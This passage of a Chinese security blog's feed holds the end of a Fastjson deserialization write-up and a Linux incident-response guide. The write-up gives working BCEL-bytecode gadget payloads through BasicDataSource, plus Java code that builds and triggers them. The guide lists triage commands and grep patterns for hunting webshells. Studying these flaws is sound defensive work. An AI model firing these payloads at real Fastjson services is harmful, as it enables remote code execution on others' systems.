string">"$$BCEL$$$l$8b$I$A$A$A$A$A$A$Ae$8f$cdJ$c3P$Q$85$cf$f4$t$89$b7Q$9bj$ab$$$5d$99$ba$b0$hw$zn$EW$82bAq$Z$c7K$b8$n$s$90$de$W$7d$y7$w$$$7c$A$lJ$9c$h$x$W$9c$cd$cca$ce$7c$9c$f9$fcz$ff$Ap$8c$3d$82w$fb$941$b3$P$ot$b3d$91$8c$f2$a4HG$Xw$99f$eb$a3I$I$s$9c$9b$c2$d8$TB3$k$5e$TZ$a7$e5$bd$sD$7f$ee$abya$cd$83$f6$R$QT$aa$edR$T$fa$f1$f0$fc$9fm$iB$a1$a3$b0$86P$60$9c$e4$i$60C$s$fd$a8$99p$Q$af$5cLme$8at$bc$K$b9$acJ$d6$b3$99$40$ba$88$i$a4$tOL$ea$80$n$b6$e1$v$b4$d0$97$Y$d3r$5e$b1$3e3$b9$c4$e8$fc$3cy$e4$u$d8GC$y$ae$g$I$d0$86$H$82$_j$m$da$95z$c3zo$f3$F$5b7$cf$b5$sG$5dz$o$e9$q$bd$7d$f8$8a$c1$efz$a7F$ed$7e$D$3c$n8iV$B$A$A"</span><span class="token punctuation">,</span>  <span class="token property">"driverClassLoader"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>上面payload只是parseObject方法能够触发<br>parse下能够触发</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token punctuation">{</span>  <span class="token property">"x"</span><span class="token operator">:</span><span class="token punctuation">{</span>    <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"</span><span class="token punctuation">,</span>    <span class="token property">"driverClassLoader"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"driverClassName"</span><span class="token operator">:</span> <span class="token string">"$$BCEL$$$l$8b$I$A$..."</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">:</span> <span class="token string">"x"</span><span class="token punctuation">}</span></code></pre><ul><li>首先是将原payload包上{}，放在value的位置，这样反序列化后，就会获得一个JSONObject对象</li><li>之后再将其包上{}，放在key的位置，在Parse中，Key为Json，则会调用其toString方法，而toString会触发getter（ASM实现），从而实现触发。</li></ul><p>也就是先再外部套一层构造出JSONObject<br>再使其为key，放入json中<br><img src="/img/4-26/13.png"><br>这里反序列化JSONObject的时候，会调用JSONObject.toString方法，然后调用getter方法</p><p>测试代码</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>exp<span class="token punctuation">.</span>low</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>classfile<span class="token punctuation">.</span></span><span class="token class-name">Utility</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span>javassist<span class="token punctuation">.</span></span><span class="token class-name">Calc</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token comment">/** * 版本： Fastjson &lt;=1.2.36版本 &lt;br/&gt; * 条件：  commons-dbcp依赖,或者是tomcat-dbcp依赖。只能parseObject触发&lt;br/&gt; * jdk:  低于jdk8u251 &lt;br/&gt; * 描述： 利用fastjson打BCEL字节码加载 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BcelCodeLoadGadget</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">bcelEncode</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytecode<span class="token punctuation">)</span>  <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">"$$BCEL$$"</span> <span class="token operator">+</span> <span class="token class-name">Utility</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>bytecode<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> <span class="token class-name">BCELCode</span><span class="token operator">=</span><span class="token function">bcelEncode</span><span class="token punctuation">(</span><span class="token class-name">Calc</span><span class="token punctuation">.</span><span class="token function">getCodeByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> data<span class="token operator">=</span><span class="token class-name">TomcatGadgetHigh</span><span class="token punctuation">(</span><span class="token class-name">BCELCode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//JSON.parse(data);</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">commonGadget</span><span class="token punctuation">(</span><span class="token class-name">String</span> <span class="token class-name">BCELCode</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">String</span> data<span class="token operator">=</span><span class="token string">"{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\n\"driverClassName\":\""</span><span class="token operator">+</span><span class="token class-name">BCELCode</span><span class="token operator">+</span><span class="token string">"\",\n\"driverClassLoader\":{\n\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n}\n}"</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> data<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token class-name">TomcatGadgetHigh</span><span class="token punctuation">(</span><span class="token class-name">String</span> <span class="token class-name">BCELCode</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">String</span> data<span class="token operator">=</span><span class="token string">"{\n\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n\"driverClassName\":\""</span><span class="token operator">+</span><span class="token class-name">BCELCode</span><span class="token operator">+</span><span class="token string">"\",\n\"driverClassLoader\":{\n\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n}\n}"</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> data<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="调式-1"><a href="#调式-1" class="headerlink" title="调式"></a>调式</h3><p>注：调的是tomcat-dbcp，另外一个代码稍有不一样<br>先看看Bcel的ClassLoader<br>com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass()<br><img src="/img/4-26/14.png"><br>会判断是否是$$BCEL$$开头<br><img src="/img/4-26/15.png"><br>跟进createClass方法<br><img src="/img/4-26/16.png"><br>会去除固定前缀，后面使用Utility.decode进行解码<br>看一眼Utility#decode<br><img src="/img/4-26/17.png"><br>里面还使用了gzip<br>再看看对应的encode<br><img src="/img/4-26/18.png"><br>这里是没有加上前缀的，写一个bcel字节码编码函数</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">bcelEncode</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytecode<span class="token punctuation">)</span>  <span class="token punctuation">{</span><span class="token keyword">try</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token string">"$$BCEL$$"</span> <span class="token operator">+</span> <span class="token class-name">Utility</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>bytecode<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>再看看触发函数<br>parseObject函数后面会调用JSON.toJSON方法，<br>在这里会调用所有的getter方法<br>BasicDataSource#getConnection<br><img src="/img/4-26/19.png"><br>跟进createDataSource方法<br><img src="/img/4-26/20.png"><br>继续跟进createConnectionFactory方法<br>然后到达DriverFactory#createDriver方法<br><img src="/img/4-26/21.png"><br>forName加载字节码，并进行了初始化</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://drops.blbana.cc/2020/04/01/Fastjson-TemplatesImpl-%E5%88%A9%E7%94%A8%E9%93%BE/">Fastjson TemplatesImpl 利用链 · BlBana’s BlackHouse</a></li><li><a href="https://chenlvtang.top/2022/07/04/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">FastJson反序列化漏洞</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 反序列化漏洞 </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux应急响应</title>
      <link href="/2024/04/25/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>/2024/04/25/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux应急响应"><a href="#Linux应急响应" class="headerlink" title="Linux应急响应"></a>Linux应急响应</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>关键目录<br><img src="/img/4-25/1.png"><br>思路：<br>账号安全 -&gt; 历史命令 -&gt; 检查异常端口 -&gt; 检查异常进程 -&gt; 检查开机启动项 -&gt; 检查定时任务 -&gt; 检查服务 -&gt; 检查异常文件</p><h2 id="主机排查"><a href="#主机排查" class="headerlink" title="主机排查"></a>主机排查</h2><h3 id="常见指令"><a href="#常见指令" class="headerlink" title="常见指令"></a>常见指令</h3><h4 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查找不常用的监听端口 :</span><span class="token function">netstat</span> <span class="token parameter variable">-anp</span>iftop<span class="token comment"># 运行的进程监听了端口 :</span><span class="token function">lsof</span> <span class="token parameter variable">-i</span><span class="token function">lsof</span> <span class="token parameter variable">-nPi</span> tcp:443<span class="token comment"># 使用ss命令查看TCP协议：</span>ss <span class="token parameter variable">-anpt</span><span class="token comment"># 使用ss命令查看UDP协议：</span>ss <span class="token parameter variable">-anpu</span><span class="token comment"># 使用 tcpdump 分析：</span>tcpdump <span class="token parameter variable">-i</span> <span class="token punctuation">{</span>网卡名<span class="token punctuation">}</span> <span class="token function">host</span> <span class="token punctuation">{</span>本地IP<span class="token punctuation">}</span> and udp port <span class="token punctuation">{</span>本地端口号<span class="token punctuation">}</span><span class="token comment"># ARP表 :</span>arp <span class="token parameter variable">-a</span><span class="token comment"># 查找监听模式的网卡 :</span><span class="token function">ip</span> <span class="token function">link</span> <span class="token operator">|</span> <span class="token function">grep</span> PROMISC<span class="token comment"># 提取所有活跃的连接 tcp ip</span>$ <span class="token function">netstat</span> <span class="token parameter variable">-ant</span> <span class="token operator">|&amp;</span> <span class="token function">grep</span> <span class="token parameter variable">-Po</span> <span class="token string">'(\d{1,3}\.){3}\d{1,3}'</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token number">10.187</span>.0 <span class="token operator">|</span> <span class="token function">uniq</span> <span class="token parameter variable">-c</span></code></pre><p>netstat参数</p><ul><li>-t或–tcp 显示TCP传输协议的连线状况</li><li>-u或–udp 显示UDP传输协议的连线状况</li><li>-n或–numeric 直接使用IP地址，而不通过域名服务器</li><li>-p或–programs 显示正在使用Socket的程序识别码和程序名称</li><li>-l或–listening 显示监控中的服务器的Socket</li><li>-a或–all 显示所有连线中的Socket</li><li>-e或–extend 显示网络其他相关信息</li></ul><p>组合使用</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">netstat</span> <span class="token parameter variable">-antp</span><span class="token function">netstat</span> <span class="token parameter variable">-antpu</span></code></pre><h4 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h4><p>操作系统中，关闭/查看系统进程，删除/新建系统服务。<br>典型场景：在应急响应过程中，排查发现可疑系统进程服务，应即时关闭恶意进程或者删除恶意服务，防止被持续控制。<br>注意事项：需要联系管理员确认进程服务是否为重要业务，防止错误关闭和删除了重要业务的进程服务。</p><p><strong>ps命令</strong><br><strong>查看全部的进程</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> <span class="token parameter variable">-aux</span></code></pre><p>查看相关进程</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> <span class="token parameter variable">-ef</span> <span class="token operator">|</span> <span class="token function">grep</span> 进程关键字</code></pre><p>显示指定用户相关进程</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> <span class="token parameter variable">-u</span> root //显示root进程用户信息</code></pre><p>查找隐藏进程<br>查找显示的进程</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> <span class="token parameter variable">-ef</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print}'</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token parameter variable">-n</span> <span class="token operator">|</span><span class="token function">uniq</span> <span class="token operator">&gt;</span><span class="token number">1</span></code></pre><p>然后查看/proc目录，查看是否存在对应进程</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> /proc <span class="token operator">|</span> <span class="token function">sort</span> <span class="token parameter variable">-n</span> <span class="token operator">|</span><span class="token function">uniq</span> <span class="token operator">&gt;</span><span class="token number">2</span></code></pre><p>参数</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">netstat</span> <span class="token parameter variable">-antlop</span>      <span class="token comment">#查看  </span><span class="token function">ps</span> <span class="token parameter variable">-ef</span>               <span class="token comment">#查看异常连接和对应的文件  </span><span class="token function">ps</span> aux               <span class="token comment">#查看那进程详细信息  </span><span class="token function">lsof</span> <span class="token parameter variable">-p</span> pid          <span class="token comment">#查看进程关联账户信息  </span>  附录：ps命令常用用法（方便查看系统进程）  <span class="token function">ps</span> a  <span class="token comment">#显示现行终端机下的所有程序，包括其他用户的程序。  </span><span class="token function">ps</span> <span class="token parameter variable">-A</span> <span class="token comment">#显示所有进程。  </span><span class="token function">ps</span> c <span class="token comment">#列出程序时，显示每个程序真正的指令名称，而不包含路径，参数或常驻服务的标示。  </span><span class="token function">ps</span> <span class="token parameter variable">-e</span> <span class="token comment">#此参数的效果和指定"A"参数相同。  </span><span class="token function">ps</span> e <span class="token comment">#列出程序时，显示每个程序所使用的环境变量。  </span><span class="token function">ps</span> f <span class="token comment">#用ASCII字符显示树状结构，表达程序间的相互关系。  </span><span class="token function">ps</span> <span class="token parameter variable">-H</span> <span class="token comment">#显示树状结构，表示程序间的相互关系。  </span><span class="token function">ps</span> <span class="token parameter variable">-N</span> <span class="token comment">#显示所有的程序，除了执行ps指令终端机下的程序之外。  </span><span class="token function">ps</span> s <span class="token comment">#采用程序信号的格式显示程序状况。  </span><span class="token function">ps</span> S <span class="token comment">#列出程序时，包括已中断的子程序资料。  </span><span class="token function">ps</span> -t<span class="token operator">&lt;</span>终端机编号<span class="token operator">&gt;</span> 　<span class="token comment">#指定终端机编号，并列出属于该终端机的程序的状况。  </span><span class="token function">ps</span> u 　 <span class="token comment">#显示所有程序，不以终端机来区分。以用户为主的格式来显示程序状况。  </span><span class="token function">ps</span> x 　<span class="token comment">#显示所有程序，不以终端机来区分。</span></code></pre><p><strong>lsof指令</strong><br>查看什么文件占用的该端口</p><pre class="language-none"><code class="language-none">lsof -i :[port]</code></pre><p>查看什么文件占用的该pid</p><pre class="language-none"><code class="language-none">lsof -p [pid]</code></pre><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h3 id="lsattr和chattr"><a href="#lsattr和chattr" class="headerlink" title="lsattr和chattr"></a>lsattr和chattr</h3><h4 id="chattr"><a href="#chattr" class="headerlink" title="chattr"></a>chattr</h4><p>修改属性能够提高系统的安全 性，但是它并不适合所有的目录。chattr命令不能保护/、/dev、/tmp、/var目录<br>a：即append，设定该参数后，只能向文件中添加数据，而不能删除，多用于服务器日志文件安全，只有root才能设定这个属性。<br>i：设定文件不能被删除、改名、设定链接关系，同时不能写入或新增内容。i参数对于文件 系统的安全设置有很大帮助。<br>s：保密性地删除文件或目录，即硬盘空间被全部收回。<br>u：与s相反，当设定为u时，数据内容其实还存在磁盘中，可以用于undeletion。<br>例子：<br>设置/etc/resolv.conf为不可修改</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@vincent tmp<span class="token punctuation">]</span><span class="token comment"># chattr +i /etc/resolv.conf </span><span class="token punctuation">[</span>root@vincent tmp<span class="token punctuation">]</span><span class="token comment"># lsattr /etc/resolv.conf </span>----i--------e- /etc/resolv.conf<span class="token punctuation">[</span>root@vincent tmp<span class="token punctuation">]</span><span class="token comment"># echo "" &gt; /etc/resolv.conf </span>-bash: /etc/resolv.conf: 权限不够</code></pre><h4 id="lsattr"><a href="#lsattr" class="headerlink" title="lsattr"></a>lsattr</h4><p>查看文件权限</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@vincent tmp<span class="token punctuation">]</span><span class="token comment"># lsattr 1.txt </span>-----a-------e- <span class="token number">1</span>.txt</code></pre><h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><p>在Linux做的操作都会被记录到系统日志中，对于登录也可以查看日志信息查看是否有异常登录<br>last命令记录着所有用户登录系统的日志，可以用来查找非授权用户的登录事件，而last命令的输出结果来源于**/var/log/wtmp**文件，稍有经验的入侵者都会删掉<br><img src="/img/4-25/2.png"><br>常见日志</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">内核及公共消息日志:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log/messages计划任务日志：<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log/cron系统引导日志：<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log/dmesg邮件系统日志:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log/maillog用户登录日志：<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log/lastlog<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log/boot<span class="token punctuation">.</span>log（记录系统在引导过程中发生的时间）<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log/secure <span class="token punctuation">(</span>用户验证相关的安全性事件<span class="token punctuation">)</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log/wtmp<span class="token punctuation">(</span>当前登录用户详细信息<span class="token punctuation">)</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log/btmp（记录失败的的记录）<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>run/utmp（用户登录、注销及系统开、关等事件）</code></pre><ol><li>/var/log/secure</li></ol><p>Linux系统安全日志，记录用户和工作组的情况、用户登陆认证情况</p><ol start="2"><li>/var/log/wtmp</li></ol><p>记录每个用户的登录次数和持续的时间等信息</p><ol start="3"><li>/var/log/utmp</li></ol><p>有关当前用户登陆的信息</p><h3 id="账号"><a href="#账号" class="headerlink" title="账号"></a>账号</h3><p>1、用户信息文件 /etc/passwd</p><pre class="language-bash" data-language="bash"><code class="language-bash">root:x<span class="token punctuation">\</span>:0:0:root:/root:/bin/bashaccount:password:<span class="token environment constant">UID</span>:GID:GECOS:directory:shell</code></pre><p>用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell<br>注意：无密码只允许本机登陆，远程不允许登陆<br><strong>2、密码文件 /etc/shadow</strong></p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">root:<span class="token variable">$6</span><span class="token variable">$oGs1PqhL2p3ZetrE</span><span class="token variable">$X7o7bzoouHQVSEmSgsYN5UD4</span><span class="token punctuation">.</span>kMHx6qgbTqwNVC5oOAouXvcjQSt<span class="token punctuation">.</span>Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7::: <span class="token operator">/</span><span class="token operator">/</span>用户名：加密密码：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</code></pre><p> 其他命令</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">who      <span class="token operator">/</span><span class="token operator">/</span>查看当前登录用户（tty 本地登陆 pts 远程登录）w        <span class="token operator">/</span><span class="token operator">/</span>查看系统信息，想知道某一时刻用户的行为uptime   <span class="token operator">/</span><span class="token operator">/</span>查看登陆多久、多少用户，负载</code></pre><h3 id="系统启动项"><a href="#系统启动项" class="headerlink" title="系统启动项"></a>系统启动项</h3><p>一般来说，病毒在启动之后为了防止肉鸡关机重启，很有可能会设置恶意的开机启动项</p><p>查看运行级别命令runlevel</p><pre class="language-none"><code class="language-none">运行级别含义（七个运行模式）0关机1单用户模式，可以想象为windows的安全模式，主要用于系统修复2不完全的命令行模式，不含NFS服务3完全的命令行模式，就是标准字符界面4系统保留5图形模式/桌面模式（GUI界面）6重启动 开机启动配置文件：/etc/rc.local/etc/rc.d/rc[0~6].d</code></pre><ol><li><strong>/etc/rc.d/rc.local</strong></li></ol><p><strong>或者说是/etc/rc.local</strong><br>/etc/rc.local是/etc/rc.d/rc.local的软连接，该脚本是在系统初始化级别脚本运行之后再执行的，想要/etc/rc.local起作用必须<a href="https://so.csdn.net/so/search?q=chmod&amp;spm=1001.2101.3001.7020"><strong>chmod</strong></a> +x /etc/rc.d/rc.local</p><ol start="2"><li><strong>/etc/init.d目录下的脚本</strong></li></ol><p>目录内放的是各个服务的启动脚本，比如sshd、httpd等<br><img src="/img/4-25/3.png"></p><ol start="3"><li>** /etc/profile.d/<em>.sh</em>*</li></ol><p>/etc/profile.d/*.sh是bash的全局配置文件，/etc/profile.d/下有许多shell脚本，可以在开机时启动。</p><h3 id="定时计划"><a href="#定时计划" class="headerlink" title="定时计划"></a>定时计划</h3><p>在操作系统中，分析查看计划任务信息。<br>典型场景：在应急响应过程中，发现入侵者创建的异常计划任务，应即时禁用或者删除异常计划任务，防止被持续控制。<br>注意事项：需要联系系统管理员确认计划任务是否合法，防止错误禁用和删除了正常的计划任务。</p><p>使用命令<br>crontab<br>列出所有的计划任务</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">crontab</span> <span class="token parameter variable">-l</span></code></pre><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Root用户定时任务 :</span><span class="token function">crontab</span> <span class="token parameter variable">-u</span> root <span class="token parameter variable">-l</span></code></pre><p>编辑cron</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">crontab</span> <span class="token parameter variable">-e</span></code></pre><p>常见计划任务位置</p><pre class="language-bash" data-language="bash"><code class="language-bash">重点关注以下目录<span class="token punctuation">(</span>计划目录<span class="token punctuation">)</span>中是否存在恶意脚本：/var/spool/cron/*/etc/crontab/etc/cron.d/*/etc/cron.daily/*/etc/cron.hourly/*/etc/cron.monthly/*/etc/cron.weekly//etc/anacrontab/var/spool/anacron/*小技巧：<span class="token function">more</span> /etc/cron.daily/* 查看目录下所有文件</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 系统定时任务 :</span><span class="token function">cat</span> /etc/crontab<span class="token function">cat</span> /etc/anacrontab<span class="token comment"># 查看计划任务文件 :</span><span class="token function">ls</span> <span class="token parameter variable">-la</span> /var/spool/cron/<span class="token function">ls</span> <span class="token parameter variable">-la</span> /var/spool/anacron/<span class="token function">ls</span> <span class="token parameter variable">-la</span> /var/spool/at/spool/<span class="token comment"># 系统定时任务文件 :</span>$ <span class="token function">find</span> /etc/cron* <span class="token parameter variable">-type</span> f/etc/cron.d/sysstat/etc/cron.d/0hourly/etc/cron.daily/logrotate/etc/cron.daily/man-db.cron/etc/cron.deny/etc/cron.hourly/0anacron</code></pre><h2 id="webshell查杀"><a href="#webshell查杀" class="headerlink" title="webshell查杀"></a>webshell查杀</h2><p><strong>思路</strong><br><img src="/img/4-25/4.png"><br>网络排查、日志排查、文件排查<br>扫描工具：<br>1、D盾<br>Webshell查杀、可疑文件隔离；端口进程查看、base64解码，以及克隆用户检测等；文件监控。</p><p>2、河马Webshell查杀<br>河马Webshell查杀拥有海量Webshell样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术，支持多种操作系统。</p><p>手工指令搜索</p><pre class="language-bash" data-language="bash"><code class="language-bash">//搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征<span class="token function">find</span> ./ <span class="token builtin class-name">type</span> f <span class="token parameter variable">-name</span> <span class="token string">"*.jsp"</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">grep</span> <span class="token string">"exec("</span> <span class="token function">find</span> ./ <span class="token builtin class-name">type</span> f <span class="token parameter variable">-name</span> <span class="token string">"*.php"</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">grep</span> <span class="token string">"eval("</span> <span class="token function">find</span> ./ <span class="token builtin class-name">type</span> f <span class="token parameter variable">-name</span> <span class="token string">"*.asp"</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">grep</span> <span class="token string">"execute("</span> <span class="token function">find</span> ./ <span class="token builtin class-name">type</span> f <span class="token parameter variable">-name</span> <span class="token string">"*.aspx"</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">grep</span> <span class="token string">"eval("</span> //对于免杀Webshell，可以查看是否使用编码<span class="token function">find</span> ./ <span class="token builtin class-name">type</span> f <span class="token parameter variable">-name</span> <span class="token string">"*.php"</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">grep</span> <span class="token string">"base64_decode"</span> </code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://www.cnblogs.com/carmi/p/17804491.html">17、Linux应急响应 - gcc_com - 博客园</a></li><li><a href="https://blog.csdn.net/qq_42671480/article/details/90370715">Linux应急响应之计划任务篇_应急响应定时任务分析-CSDN博客</a></li><li><a href="https://blog.csdn.net/qq_42671480/article/details/90371042">Linux应急响应之开机启动项篇_3、排查启动脚本-CSDN博客</a></li><li><a href="https://blog.csdn.net/sycamorelg/article/details/123516928">网络安全应急响应—-9、WebShell应急响应_webshell查杀-CSDN博客</a></li><li><a href="https://github.com/Lorna-Dane/Blue-Team/blob/main/%E5%BA%94%E6%80%A5/linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%89%8B%E5%86%8C.md">Blue-Team/应急/linux应急响应手册.md at main · Lorna-Dane/Blue-Team</a></li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> 蓝队 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> 应急响应 </tag>
            
            <tag> 蓝队 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JNDI注入</title>
      <link href="/2024/04/24/JNDI%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/04/24/JNDI%E6%B3%A8%E5%85%A5/</url>
      
